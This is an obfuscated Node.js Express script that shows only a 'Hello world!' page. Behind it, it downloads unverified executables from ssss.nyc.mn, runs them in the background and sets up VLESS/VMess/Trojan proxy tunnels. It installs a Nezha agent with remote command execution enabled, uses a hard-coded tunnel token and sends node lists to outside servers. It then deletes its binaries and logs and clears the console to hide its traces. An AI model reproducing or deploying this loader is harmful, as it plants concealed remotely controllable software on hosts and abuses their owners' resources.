const _0x164439=_0x231d;(function(_0x4aed63,_0x48467f){const _0x46c224=_0x231d,_0x5f2e89=_0x4aed63();while(!![]){try{const _0x250051=parseInt(_0x46c224(0xe9))/0x1+parseInt(_0x46c224(0x137))/0x2*(-parseInt(_0x46c224(0x127))/0x3)+-parseInt(_0x46c224(0xd3))/0x4*(parseInt(_0x46c224(0xb5))/0x5)+parseInt(_0x46c224(0xeb))/0x6*(-parseInt(_0x46c224(0xf0))/0x7)+-parseInt(_0x46c224(0x12e))/0x8*(parseInt(_0x46c224(0x109))/0x9)+parseInt(_0x46c224(0x101))/0xa*(-parseInt(_0x46c224(0x10c))/0xb)+-parseInt(_0x46c224(0x149))/0xc*(-parseInt(_0x46c224(0xb8))/0xd);if(_0x250051===_0x48467f)break;else _0x5f2e89['push'](_0x5f2e89['shift']());}catch(_0x3ee09a){_0x5f2e89['push'](_0x5f2e89['shift']());}}}(_0x3559,0xd187d));const express=require(_0x164439(0x121)),app=express(),axios=require(_0x164439(0x106)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require('child_process')[_0x164439(0xd4)]),{execSync}=require(_0x164439(0xfb)),UPLOAD_URL=process[_0x164439(0xd6)][_0x164439(0xdc)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x164439(0xd6)][_0x164439(0x135)]||![],FILE_PATH=process[_0x164439(0xd6)][_0x164439(0x10d)]||'./tmp',SUB_PATH=process[_0x164439(0xd6)]['SUB_PATH']||_0x164439(0xe5),PORT=process[_0x164439(0xd6)][_0x164439(0x142)]||process[_0x164439(0xd6)][_0x164439(0x14e)]||0xbb8,UUID=process[_0x164439(0xd6)][_0x164439(0x14d)]||'93df5cf5-bc13-4ecc-ad70-c2d3797bbb83',NEZHA_SERVER=process[_0x164439(0xd6)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x164439(0x143)]||'',NEZHA_KEY=process['env'][_0x164439(0xf3)]||'',ARGO_DOMAIN=process[_0x164439(0xd6)][_0x164439(0x9a)]||_0x164439(0xb4),ARGO_AUTH=process[_0x164439(0xd6)][_0x164439(0x111)]||_0x164439(0x9d),ARGO_PORT=process['env'][_0x164439(0x130)]||0x1f41,CFIP=process[_0x164439(0xd6)][_0x164439(0xa1)]||_0x164439(0x150),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x164439(0xd6)]['NAME']||_0x164439(0xcc);!fs[_0x164439(0xcf)](FILE_PATH)?(fs[_0x164439(0xba)](FILE_PATH),console['log'](FILE_PATH+_0x164439(0xef))):console['log'](FILE_PATH+_0x164439(0x11c));function _0x231d(_0x15c6c5,_0x398b7f){const _0x3559c8=_0x3559();return _0x231d=function(_0x231d75,_0x538801){_0x231d75=_0x231d75-0x97;let _0x253692=_0x3559c8[_0x231d75];return _0x253692;},_0x231d(_0x15c6c5,_0x398b7f);}function generateRandomName(){const _0x2dc1f8=_0x164439,_0x370047='abcdefghijklmnopqrstuvwxyz';let _0x544fa0='';for(let _0x39e4e5=0x0;_0x39e4e5<0x6;_0x39e4e5++){_0x544fa0+=_0x370047['charAt'](Math['floor'](Math[_0x2dc1f8(0x10f)]()*_0x370047[_0x2dc1f8(0xae)]));}return _0x544fa0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x164439(0xa7)](FILE_PATH,npmName),phpPath=path[_0x164439(0xa7)](FILE_PATH,phpName),webPath=path[_0x164439(0xa7)](FILE_PATH,webName),botPath=path[_0x164439(0xa7)](FILE_PATH,botName),subPath=path[_0x164439(0xa7)](FILE_PATH,_0x164439(0xec)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x164439(0xa7)](FILE_PATH,_0x164439(0x120)),configPath=path[_0x164439(0xa7)](FILE_PATH,_0x164439(0x12b));function deleteNodes(){const _0x1c29e5=_0x164439;try{if(!UPLOAD_URL)return;if(!fs[_0x1c29e5(0xcf)](subPath))return;let _0x13ffe9;try{_0x13ffe9=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x50575d=Buffer[_0x1c29e5(0x136)](_0x13ffe9,'base64')[_0x1c29e5(0x98)](_0x1c29e5(0xdd)),_0xb15cda=_0x50575d[_0x1c29e5(0xa5)]('\x0a')['filter'](_0x44b56d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1c29e5(0x110)](_0x44b56d));if(_0xb15cda[_0x1c29e5(0xae)]===0x0)return;return axios[_0x1c29e5(0x108)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x1c29e5(0xb3)]({'nodes':_0xb15cda}),{'headers':{'Content-Type':_0x1c29e5(0x128)}})['catch'](_0x357813=>{return null;}),null;}catch(_0x5da6b1){return null;}}function cleanupOldFiles(){const _0x54389d=_0x164439;try{const _0x45229e=fs['readdirSync'](FILE_PATH);_0x45229e[_0x54389d(0x133)](_0x43ec05=>{const _0x290b9b=_0x54389d,_0x198ec6=path['join'](FILE_PATH,_0x43ec05);try{const _0x52eba1=fs[_0x290b9b(0xd5)](_0x198ec6);_0x52eba1[_0x290b9b(0xaa)]()&&fs[_0x290b9b(0xad)](_0x198ec6);}catch(_0x3ec949){}});}catch(_0xf3ed39){}}app[_0x164439(0xf7)]('/',function(_0x541d9f,_0x3a9356){const _0x33b669=_0x164439;_0x3a9356['send'](_0x33b669(0xea));});async function generateConfig(){const _0x105205=_0x164439,_0x26e6ba={'log':{'access':'/dev/null','error':_0x105205(0x13f),'loglevel':_0x105205(0x103)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x105205(0xa4),'settings':{'clients':[{'id':UUID,'flow':_0x105205(0xab)}],'decryption':_0x105205(0x103),'fallbacks':[{'dest':0xbb9},{'path':_0x105205(0x9c),'dest':0xbba},{'path':_0x105205(0xe8),'dest':0xbbb},{'path':_0x105205(0xd7),'dest':0xbbc}]},'streamSettings':{'network':_0x105205(0xa3)}},{'port':0xbb9,'listen':_0x105205(0x119),'protocol':_0x105205(0xa4),'settings':{'clients':[{'id':UUID}],'decryption':_0x105205(0x103)},'streamSettings':{'network':_0x105205(0xa3),'security':'none'}},{'port':0xbba,'listen':_0x105205(0x119),'protocol':_0x105205(0xa4),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x105205(0x103)},'streamSettings':{'network':'ws','security':_0x105205(0x103),'wsSettings':{'path':_0x105205(0x9c)}},'sniffing':{'enabled':!![],'destOverride':[_0x105205(0x10b),_0x105205(0xe4),_0x105205(0xf9)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x105205(0x119),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x105205(0xe8)}},'sniffing':{'enabled':!![],'destOverride':[_0x105205(0x10b),'tls',_0x105205(0xf9)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x105205(0x119),'protocol':_0x105205(0x118),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x105205(0x103),'wsSettings':{'path':_0x105205(0xd7)}},'sniffing':{'enabled':!![],'destOverride':[_0x105205(0x10b),_0x105205(0xe4),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x105205(0x107),'tag':_0x105205(0xd0)},{'protocol':_0x105205(0xc0),'tag':_0x105205(0x97)}]};fs[_0x105205(0x12d)](path[_0x105205(0xa7)](FILE_PATH,'config.json'),JSON[_0x105205(0xb3)](_0x26e6ba,null,0x2));}function getSystemArchitecture(){const _0x2b1453=_0x164439,_0x2f6364=os[_0x2b1453(0xd1)]();return _0x2f6364==='arm'||_0x2f6364===_0x2b1453(0x105)||_0x2f6364===_0x2b1453(0x9e)?_0x2b1453(0xc4):_0x2b1453(0xfd);}function downloadFile(_0x14544c,_0x26f64d,_0x5786a5){const _0x1529be=_0x164439,_0x3d5346=_0x14544c;!fs[_0x1529be(0xcf)](FILE_PATH)&&fs[_0x1529be(0xba)](FILE_PATH,{'recursive':!![]});const _0x598459=fs[_0x1529be(0xee)](_0x3d5346);axios({'method':'get','url':_0x26f64d,'responseType':_0x1529be(0x12a)})[_0x1529be(0x114)](_0x226e8b=>{const _0x5c5ffb=_0x1529be;_0x226e8b[_0x5c5ffb(0xf5)][_0x5c5ffb(0x140)](_0x598459),_0x598459['on'](_0x5c5ffb(0xed),()=>{const _0x30b307=_0x5c5ffb;_0x598459[_0x30b307(0xf2)](),console[_0x30b307(0xc3)]('Download\x20'+path[_0x30b307(0xa2)](_0x3d5346)+_0x30b307(0xd9)),_0x5786a5(null,_0x3d5346);}),_0x598459['on'](_0x5c5ffb(0xe0),_0xd0d789=>{const _0x540f0d=_0x5c5ffb;fs[_0x540f0d(0x13b)](_0x3d5346,()=>{});const _0x19ef9e=_0x540f0d(0xac)+path[_0x540f0d(0xa2)](_0x3d5346)+'\x20failed:\x20'+_0xd0d789[_0x540f0d(0xbd)];console[_0x540f0d(0xe0)](_0x19ef9e),_0x5786a5(_0x19ef9e);});})[_0x1529be(0xc6)](_0x2735a5=>{const _0x211c9f=_0x1529be,_0x48ba38=_0x211c9f(0xac)+path[_0x211c9f(0xa2)](_0x3d5346)+_0x211c9f(0x145)+_0x2735a5[_0x211c9f(0xbd)];console[_0x211c9f(0xe0)](_0x48ba38),_0x5786a5(_0x48ba38);});}async function downloadFilesAndRun(){const _0x4213ff=_0x164439,_0xa412d5=getSystemArchitecture(),_0x23d867=getFilesForArchitecture(_0xa412d5);if(_0x23d867[_0x4213ff(0xae)]===0x0){console[_0x4213ff(0xc3)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x2b5875=_0x23d867[_0x4213ff(0xb2)](_0x1e77fe=>{return new Promise((_0x11bec1,_0x2d8b6a)=>{const _0x5d3d00=_0x231d;downloadFile(_0x1e77fe[_0x5d3d00(0xb1)],_0x1e77fe['fileUrl'],(_0x4f8a17,_0x48e7d4)=>{_0x4f8a17?_0x2d8b6a(_0x4f8a17):_0x11bec1(_0x48e7d4);});});});try{await Promise['all'](_0x2b5875);}catch(_0x508973){console[_0x4213ff(0xe0)](_0x4213ff(0x9f),_0x508973);return;}function _0x9ff10b(_0x518072){const _0x2fd4f6=_0x4213ff,_0x5a0bb5=0x1fd;_0x518072[_0x2fd4f6(0x133)](_0x289703=>{fs['existsSync'](_0x289703)&&fs['chmod'](_0x289703,_0x5a0bb5,_0x31f6c1=>{const _0x4a0bf5=_0x231d;_0x31f6c1?console['error'](_0x4a0bf5(0x148)+_0x289703+':\x20'+_0x31f6c1):console['log']('Empowerment\x20success\x20for\x20'+_0x289703+':\x20'+_0x5a0bb5[_0x4a0bf5(0x98)](0x8));});});}const _0x1250da=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x9ff10b(_0x1250da);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x43ea86=NEZHA_SERVER[_0x4213ff(0x139)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x4fe37b=new Set([_0x4213ff(0x117),_0x4213ff(0x13c),_0x4213ff(0x131),_0x4213ff(0x126),_0x4213ff(0x13a),'2053']),_0x234029=_0x4fe37b['has'](_0x43ea86)?_0x4213ff(0x147):_0x4213ff(0xf6),_0x527496='\x0aclient_secret:\x20'+NEZHA_KEY+_0x4213ff(0xfa)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x234029+_0x4213ff(0x115)+UUID;fs['writeFileSync'](path[_0x4213ff(0xa7)](FILE_PATH,_0x4213ff(0xe7)),_0x527496);const _0x1c408e=_0x4213ff(0xbe)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1c408e),console[_0x4213ff(0xc3)](phpName+_0x4213ff(0xf1)),await new Promise(_0x17e58d=>setTimeout(_0x17e58d,0x3e8));}catch(_0x2e3f2d){console[_0x4213ff(0xe0)](_0x4213ff(0xa0)+_0x2e3f2d);}}else{let _0x410f84='';const _0x5ae69b=['443',_0x4213ff(0x13c),_0x4213ff(0x131),_0x4213ff(0x126),_0x4213ff(0x13a),'2053'];_0x5ae69b[_0x4213ff(0x139)](NEZHA_PORT)&&(_0x410f84=_0x4213ff(0xfc));const _0x54192e=_0x4213ff(0xbe)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4213ff(0x144)+NEZHA_KEY+'\x20'+_0x410f84+_0x4213ff(0x134);try{await exec(_0x54192e),console[_0x4213ff(0xc3)](npmName+_0x4213ff(0xf1)),await new Promise(_0xe5981a=>setTimeout(_0xe5981a,0x3e8));}catch(_0x437fa9){console[_0x4213ff(0xe0)]('npm\x20running\x20error:\x20'+_0x437fa9);}}}else console['log'](_0x4213ff(0xcb));const _0x2df0c1='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x4213ff(0x124);try{await exec(_0x2df0c1),console['log'](webName+_0x4213ff(0xf1)),await new Promise(_0x4bd9ba=>setTimeout(_0x4bd9ba,0x3e8));}catch(_0x3e357a){console['error'](_0x4213ff(0x100)+_0x3e357a);}if(fs[_0x4213ff(0xcf)](botPath)){let _0x230e45;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x230e45=_0x4213ff(0x104)+ARGO_AUTH;else ARGO_AUTH[_0x4213ff(0x12c)](/TunnelSecret/)?_0x230e45=_0x4213ff(0x116)+FILE_PATH+_0x4213ff(0x10e):_0x230e45=_0x4213ff(0xb6)+FILE_PATH+_0x4213ff(0xa9)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x230e45+_0x4213ff(0x141)),console[_0x4213ff(0xc3)](botName+_0x4213ff(0xf1)),await new Promise(_0xf382a4=>setTimeout(_0xf382a4,0x7d0));}catch(_0x2b2e4f){console[_0x4213ff(0xe0)](_0x4213ff(0xbc)+_0x2b2e4f);}}await new Promise(_0x4133aa=>setTimeout(_0x4133aa,0x1388));}function getFilesForArchitecture(_0xfeba77){const _0x1f253f=_0x164439;let _0x1a7656;_0xfeba77===_0x1f253f(0xc4)?_0x1a7656=[{'fileName':webPath,'fileUrl':_0x1f253f(0xc1)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x1a7656=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x17dfd6=_0xfeba77==='arm'?_0x1f253f(0x11d):'https://amd64.ssss.nyc.mn/agent';_0x1a7656['unshift']({'fileName':npmPath,'fileUrl':_0x17dfd6});}else{const _0x54d451=_0xfeba77===_0x1f253f(0xc4)?_0x1f253f(0xdb):'https://amd64.ssss.nyc.mn/v1';_0x1a7656[_0x1f253f(0xc8)]({'fileName':phpPath,'fileUrl':_0x54d451});}}return _0x1a7656;}function argoType(){const _0x245f69=_0x164439;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x245f69(0xc3)](_0x245f69(0xb7));return;}if(ARGO_AUTH[_0x245f69(0x139)]('TunnelSecret')){fs[_0x245f69(0x12d)](path[_0x245f69(0xa7)](FILE_PATH,_0x245f69(0xd2)),ARGO_AUTH);const _0x4e9ad3=_0x245f69(0x13d)+ARGO_AUTH[_0x245f69(0xa5)]('\x22')[0xb]+_0x245f69(0xf8)+path[_0x245f69(0xa7)](FILE_PATH,_0x245f69(0xd2))+_0x245f69(0x14a)+ARGO_DOMAIN+_0x245f69(0xf4)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x245f69(0xa7)](FILE_PATH,_0x245f69(0xc2)),_0x4e9ad3);}else console[_0x245f69(0xc3)](_0x245f69(0x129));}argoType();async function extractDomains(){const _0x11db0a=_0x164439;let _0x27d3e3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x27d3e3=ARGO_DOMAIN,console['log'](_0x11db0a(0xdf),_0x27d3e3),await _0x3269a8(_0x27d3e3);else try{const _0x5af468=fs[_0x11db0a(0x122)](path[_0x11db0a(0xa7)](FILE_PATH,_0x11db0a(0x120)),_0x11db0a(0xdd)),_0x5da6f2=_0x5af468[_0x11db0a(0xa5)]('\x0a'),_0x2db510=[];_0x5da6f2[_0x11db0a(0x133)](_0x5e5d80=>{const _0x709046=_0x11db0a,_0x33b6d9=_0x5e5d80[_0x709046(0x12c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x33b6d9){const _0x39f47b=_0x33b6d9[0x1];_0x2db510[_0x709046(0xa6)](_0x39f47b);}});if(_0x2db510['length']>0x0)_0x27d3e3=_0x2db510[0x0],console[_0x11db0a(0xc3)](_0x11db0a(0xe6),_0x27d3e3),await _0x3269a8(_0x27d3e3);else{console[_0x11db0a(0xc3)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x11db0a(0xa7)](FILE_PATH,_0x11db0a(0x120)));async function _0x33e8de(){const _0x2848cc=_0x11db0a;try{process['platform']===_0x2848cc(0xaf)?await exec(_0x2848cc(0xe3)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x2848cc(0xe2)](0x0)+']'+botName[_0x2848cc(0xc9)](0x1)+_0x2848cc(0xbb));}catch(_0x4f2cd1){}}_0x33e8de(),await new Promise(_0xd39846=>setTimeout(_0xd39846,0xbb8));const _0x23ab04=_0x11db0a(0xb6)+FILE_PATH+_0x11db0a(0xa9)+ARGO_PORT;try{await exec(_0x11db0a(0xbe)+botPath+'\x20'+_0x23ab04+'\x20>/dev/null\x202>&1\x20&'),console[_0x11db0a(0xc3)](botName+_0x11db0a(0xf1)),await new Promise(_0x200540=>setTimeout(_0x200540,0xbb8)),await extractDomains();}catch(_0x551737){console[_0x11db0a(0xe0)](_0x11db0a(0xbc)+_0x551737);}}}catch(_0x5ed2b){console['error']('Error\x20reading\x20boot.log:',_0x5ed2b);}async function _0x3269a8(_0x303c0f){const _0x3d4644=_0x11db0a,_0x4d9476=execSync(_0x3d4644(0x14c),{'encoding':_0x3d4644(0xdd)}),_0x92a40f=_0x4d9476[_0x3d4644(0x14f)](),_0x83f102=NAME?NAME+'-'+_0x92a40f:_0x92a40f;return new Promise(_0x164bc0=>{setTimeout(()=>{const _0x7efaa6=_0x231d,_0x471399={'v':'2','ps':''+_0x83f102,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x7efaa6(0x103),'net':'ws','type':_0x7efaa6(0x103),'host':_0x303c0f,'path':_0x7efaa6(0xde),'tls':'tls','sni':_0x303c0f,'alpn':'','fp':_0x7efaa6(0x9b)},_0x59922c='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x7efaa6(0xcd)+_0x303c0f+_0x7efaa6(0xb0)+_0x303c0f+_0x7efaa6(0xb9)+_0x83f102+_0x7efaa6(0xc5)+Buffer[_0x7efaa6(0x136)](JSON[_0x7efaa6(0xb3)](_0x471399))[_0x7efaa6(0x98)](_0x7efaa6(0x11a))+_0x7efaa6(0xca)+UUID+'@'+CFIP+':'+CFPORT+_0x7efaa6(0x14b)+_0x303c0f+_0x7efaa6(0xb0)+_0x303c0f+_0x7efaa6(0xda)+_0x83f102+_0x7efaa6(0x10a);console['log'](Buffer['from'](_0x59922c)[_0x7efaa6(0x98)](_0x7efaa6(0x11a))),fs[_0x7efaa6(0x12d)](subPath,Buffer[_0x7efaa6(0x136)](_0x59922c)[_0x7efaa6(0x98)](_0x7efaa6(0x11a))),console[_0x7efaa6(0xc3)](FILE_PATH+_0x7efaa6(0xe1)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4feb2a,_0x3300e2)=>{const _0xc6624=_0x7efaa6,_0x47b60f=Buffer['from'](_0x59922c)[_0xc6624(0x98)](_0xc6624(0x11a));_0x3300e2[_0xc6624(0x132)](_0xc6624(0x146),_0xc6624(0x12f)),_0x3300e2[_0xc6624(0x138)](_0x47b60f);}),_0x164bc0(_0x59922c);},0x7d0);});}}async function uploadNodes(){const _0x50afff=_0x164439;if(UPLOAD_URL&&PROJECT_URL){const _0x2c82a9=PROJECT_URL+'/'+SUB_PATH,_0x32c95d={'subscription':[_0x2c82a9]};try{const _0x4006c4=await axios[_0x50afff(0x108)](UPLOAD_URL+_0x50afff(0x112),_0x32c95d,{'headers':{'Content-Type':_0x50afff(0x128)}});return _0x4006c4&&_0x4006c4[_0x50afff(0xc7)]===0xc8?(console[_0x50afff(0xc3)](_0x50afff(0xfe)),_0x4006c4):null;}catch(_0x443e98){if(_0x443e98[_0x50afff(0x99)]){if(_0x443e98[_0x50afff(0x99)][_0x50afff(0xc7)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x50afff(0xcf)](listPath))return;const _0x1fc621=fs['readFileSync'](listPath,'utf-8'),_0x44ead2=_0x1fc621[_0x50afff(0xa5)]('\x0a')[_0x50afff(0xce)](_0x2d1ecf=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x50afff(0x110)](_0x2d1ecf));if(_0x44ead2[_0x50afff(0xae)]===0x0)return;const _0xc0ef67=JSON[_0x50afff(0xb3)]({'nodes':_0x44ead2});try{const _0x3056a7=await axios[_0x50afff(0x108)](UPLOAD_URL+'/api/add-nodes',_0xc0ef67,{'headers':{'Content-Type':'application/json'}});return _0x3056a7&&_0x3056a7[_0x50afff(0xc7)]===0xc8?(console[_0x50afff(0xc3)](_0x50afff(0x113)),_0x3056a7):null;}catch(_0x311466){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4fe847=_0x231d,_0x272bf5=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x272bf5[_0x4fe847(0xa6)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x272bf5[_0x4fe847(0xa6)](phpPath);process[_0x4fe847(0xff)]===_0x4fe847(0xaf)?exec(_0x4fe847(0x13e)+_0x272bf5[_0x4fe847(0xa7)]('\x20')+_0x4fe847(0xd8),_0x22dc33=>{const _0x317548=_0x4fe847;console['clear'](),console[_0x317548(0xc3)](_0x317548(0x11e)),console[_0x317548(0xc3)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x272bf5[_0x4fe847(0xa7)]('\x20')+'\x20>/dev/null\x202>&1',_0x6aa12=>{const _0x87d011=_0x4fe847;console['clear'](),console[_0x87d011(0xc3)](_0x87d011(0x11e)),console['log'](_0x87d011(0xbf));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5e48d1=_0x164439;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5e48d1(0xc3)](_0x5e48d1(0x11f));return;}try{const _0x3bed9b=await axios['post'](_0x5e48d1(0xa8),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5e48d1(0x128)}});return console['log'](_0x5e48d1(0x123)),_0x3bed9b;}catch(_0x5cc4a0){return console[_0x5e48d1(0xe0)](_0x5e48d1(0x11b)+_0x5cc4a0['message']),null;}}function _0x3559(){const _0x594545=['trim','cdns.doon.eu.org','block','toString','response','ARGO_DOMAIN','firefox','/vless-argo','eyJhIjoiOWI4ZTdhOTliZmYxODBhMzJmNjA3NTM1OGNlNjljMWQiLCJ0IjoiMWI5YzQ0MjMtNGVkNC00ZjMzLTk3NDUtYzQzOGYwYzI3NjZlIiwicyI6IlpHVmlOakV5WmpJdFlqUXpNUzAwTWpFNUxXRTRNemt0TkRGaE1tVmxaV1prTVRBMyJ9','aarch64','Error\x20downloading\x20files:','php\x20running\x20error:\x20','CFIP','basename','tcp','vless','split','push','join','https://oooo.serv00.net/add-url','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','isFile','xtls-rprx-vision','Download\x20','unlinkSync','length','win32','&fp=firefox&type=ws&host=','fileName','map','stringify','shoucuodl.tct896.dpdns.org','3569595lAAjOd','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','384657Ikaheb','&path=%2Fvless-argo%3Fed%3D2560#','mkdirSync','\x22\x20>\x20/dev/null\x202>&1','Error\x20executing\x20command:\x20','message','nohup\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','blackhole','https://arm64.ssss.nyc.mn/web','tunnel.yml','log','arm','\x0a\x20\x20\x0avmess://','catch','status','unshift','substring','\x0a\x20\x20\x0atrojan://','NEZHA\x20variable\x20is\x20empty,skip\x20running','shuocuo-dl-org','?encryption=none&security=tls&sni=','filter','existsSync','direct','arch','tunnel.json','4bRDfVI','exec','statSync','env','/trojan-argo','\x20>\x20nul\x202>&1','\x20successfully','&path=%2Ftrojan-argo%3Fed%3D2560#','https://arm64.ssss.nyc.mn/v1','UPLOAD_URL','utf-8','/vmess-argo?ed=2560','ARGO_DOMAIN:','error','/sub.txt\x20saved\x20successfully','charAt','taskkill\x20/f\x20/im\x20','tls','2025','ArgoDomain:','config.yaml','/vmess-argo','755446IfHjoh','Hello\x20world!','228018OcugfG','sub.txt','finish','createWriteStream','\x20is\x20created','77bvgqHE','\x20is\x20running','close','NEZHA_KEY','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','data','false','get','\x0a\x20\x20credentials-file:\x20','quic','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','child_process','--tls','amd','Subscription\x20uploaded\x20successfully','platform','web\x20running\x20error:\x20','6010VKamul','http\x20server\x20is\x20running\x20on\x20port:','none','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','arm64','axios','freedom','post','24417kckenZ','\x0a\x20\x20\x20\x20','http','29227mCKPqa','FILE_PATH','/tunnel.yml\x20run','random','test','ARGO_AUTH','/api/add-subscriptions','Nodes\x20uploaded\x20successfully','then','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','443','trojan','127.0.0.1','base64','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20already\x20exists','https://arm64.ssss.nyc.mn/agent','App\x20is\x20running','Skipping\x20adding\x20automatic\x20access\x20task','boot.log','express','readFileSync','automatic\x20access\x20task\x20added\x20successfully','/config.json\x20>/dev/null\x202>&1\x20&','Unhandled\x20error\x20in\x20startserver:','2087','824871BqIAQt','application/json','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','stream','config.json','match','writeFileSync','1880mQnTiV','text/plain;\x20charset=utf-8','ARGO_PORT','2096','set','forEach','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','AUTO_ACCESS','from','12MroVZC','send','includes','2083','unlink','8443','\x0a\x20\x20tunnel:\x20','del\x20/f\x20/q\x20','/dev/null','pipe','\x20>/dev/null\x202>&1\x20&','SERVER_PORT','NEZHA_PORT','\x20-p\x20','\x20failed:\x20','Content-Type','true','Empowerment\x20failed\x20for\x20','2076BBrHyt','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','?security=tls&sni=','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','UUID','PORT'];_0x3559=function(){return _0x594545;};return _0x3559();}async function startserver(){const _0x51360d=_0x164439;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1b2906){console[_0x51360d(0xe0)]('Error\x20in\x20startserver:',_0x1b2906);}}startserver()['catch'](_0x217425=>{const _0x27fc0c=_0x164439;console[_0x27fc0c(0xe0)](_0x27fc0c(0x125),_0x217425);}),app['listen'](PORT,()=>console[_0x164439(0xc3)](_0x164439(0x102)+PORT+'!'));
